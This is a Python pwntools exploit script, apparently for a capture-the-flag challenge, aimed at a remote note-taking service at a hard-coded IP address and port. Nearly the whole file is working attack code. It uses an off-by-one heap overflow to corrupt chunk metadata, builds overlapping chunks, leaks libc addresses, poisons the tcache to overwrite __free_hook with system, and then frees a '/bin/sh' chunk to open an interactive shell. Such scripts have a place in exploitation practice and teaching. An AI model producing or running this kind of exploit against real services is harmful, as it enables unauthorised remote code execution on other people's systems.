#!/usr/bin/env python3
"""
Off-by-one heap exploitation for note-taking service
Exploits append operation that writes one byte too many
"""

from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

HOST = '212.2.250.33'
PORT = 31553

def exploit():
    io = remote(HOST, PORT)
    
    # Parse leaked addresses
    data = io.recvuntil(b'> ')
    log.info(f"Initial output:\n{data.decode()}")
    
    # Extract heap addresses
    heap_addrs = []
    for line in data.split(b'\n'):
        if b'0x' in line:
            try:
                addr = int(line.split(b'0x')[1].split()[0], 16)
                heap_addrs.append(addr)
                log.info(f"Found address: {hex(addr)}")
            except:
                pass
    
    if len(heap_addrs) >= 2:
        heap_base = heap_addrs[0]
        heap_diff = heap_addrs[1] - heap_addrs[0]
        log.success(f"Heap base: {hex(heap_base)}")
        log.success(f"Heap diff: {hex(heap_diff)}")
    
    # Classic off-by-one exploitation technique:
    # 1. Create three chunks: A, B, C
    # 2. Fill A completely
    # 3. Append to A triggers off-by-one, corrupts B's size
    # 4. Free B (with corrupted size)
    # 5. Reallocate to create overlapping chunks
    # 6. Use overlap to corrupt tcache fd pointer
    # 7. Allocate to __free_hook and overwrite with system
    
    def send_choice(choice):
        io.sendlineafter(b'> ', str(choice).encode())
    
    def create(size, content):
        send_choice(1)
        io.sendlineafter(b': ', str(size).encode())
        io.sendlineafter(b': ', content)
        log.info(f"Created note with size {size}")
    
    def edit(idx, content):
        send_choice(2)
        io.sendlineafter(b': ', str(idx).encode())
        io.sendlineafter(b': ', content)
        log.info(f"Edited note {idx}")
    
    def delete(idx):
        send_choice(3)
        io.sendlineafter(b': ', str(idx).encode())
        log.info(f"Deleted note {idx}")
    
    def show(idx):
        send_choice(4)
        io.sendlineafter(b': ', str(idx).encode())
        log.info(f"Showing note {idx}")
        return io.recvuntil(b'> ', drop=True)
    
    # Phase 1: Setup heap layout
    create(0x88, b'A' * 8)  # Chunk 0
    create(0x88, b'B' * 8)  # Chunk 1 (victim)
    create(0x88, b'C' * 8)  # Chunk 2 (prevent consolidation)
    create(0x18, b'D' * 8)  # Chunk 3 (guard)
    
    # Phase 2: Trigger off-by-one
    # Fill chunk 0 to capacity
    edit(0, b'A' * 0x88)
    
    # Append one more byte - this overflows into chunk 1's size field
    # We want to clear the PREV_INUSE bit and potentially modify size
    # Size field is at offset 0x88 from chunk 0's data
    # We'll overwrite it with a value that clears prev_inuse
    edit(0, b'\x90')  # Overwrite size LSB (0x91 -> 0x90, clears prev_inuse)
    
    # Phase 3: Exploit the corrupted size
    # Delete chunk 1 - it will try to consolidate with "previous" chunk
    delete(1)
    
    # Phase 4: Create overlapping chunks
    # Allocate a chunk that will overlap with chunk 2
    create(0x88, b'OVERLAP' * 16)  # Chunk 1 (new)
    
    # Phase 5: Leak libc through unsorted bin
    create(0x400, b'LARGE')  # Chunk 4 - goes to unsorted bin when freed
    delete(4)
    create(0x100, b'X' * 8)  # Chunk 4 (partial realloc, leaves libc ptrs)
    
    # Show chunk 4 to leak libc
    data = show(4)
    if b'\x7f' in data:
        # Extract libc address
        leak_idx = data.find(b'\x7f')
        if leak_idx > 0:
            libc_leak = u64(data[leak_idx-5:leak_idx+3].ljust(8, b'\x00'))
            log.success(f"Libc leak: {hex(libc_leak)}")
            
            # Calculate libc base (adjust offset based on actual libc)
            libc_base = libc_leak - 0x1ecbe0  # main_arena+96 offset
            free_hook = libc_base + 0x1eee48
            system = libc_base + 0x52290
            
            log.success(f"Libc base: {hex(libc_base)}")
            log.success(f"__free_hook: {hex(free_hook)}")
            log.success(f"system: {hex(system)}")
            
            # Phase 6: Tcache poisoning
            # Use the overlap to overwrite chunk 2's fd pointer
            payload = b'E' * 0x10
            payload += p64(0x21)  # Fake chunk size
            payload += p64(free_hook)  # Overwrite fd
            edit(1, payload)
            
            # Free chunk 2 to put poisoned pointer in tcache
            delete(2)
            
            # Allocate twice to get chunk at __free_hook
            create(0x18, b'/bin/sh\x00')  # Chunk 2
            create(0x18, p64(system))  # Chunk 5 - writes to __free_hook
            
            # Trigger shell by freeing chunk with "/bin/sh"
            delete(2)
            
            io.interactive()
    else:
        log.warning("No libc leak found, dumping data")
        log.info(f"Data: {data}")
        io.interactive()

if __name__ == '__main__':
    exploit()
